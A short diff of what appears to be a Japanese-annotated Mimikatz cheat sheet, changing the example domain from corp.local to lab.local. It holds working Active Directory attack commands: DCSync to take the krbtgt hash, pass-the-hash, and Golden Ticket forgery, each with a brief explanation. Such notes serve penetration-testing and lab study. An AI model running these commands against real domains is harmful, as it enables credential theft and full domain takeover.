@@ -45,10 +45,10 @@ lsadump::dcsync /user:krbtgt
 #  → （ドメインで複製権限があれば）DCSync を Mimikatz 単体で実行。krbtgt 奪取 → Golden へ
 
 # ---- チケット偽造・悪用 ----
-sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<hash> /run:cmd
+sekurlsa::pth /user:administrator /domain:lab.local /ntlm:<hash> /run:cmd
 #  → Pass-the-Hash。ハッシュで新しいプロセスを起動
 
-kerberos::golden /user:administrator /domain:corp.local /sid:<SID> /krbtgt:<hash> /ptt
+kerberos::golden /user:administrator /domain:lab.local /sid:<SID> /krbtgt:<hash> /ptt
 #  → Golden Ticket を生成してその場で読み込む
 ```
 
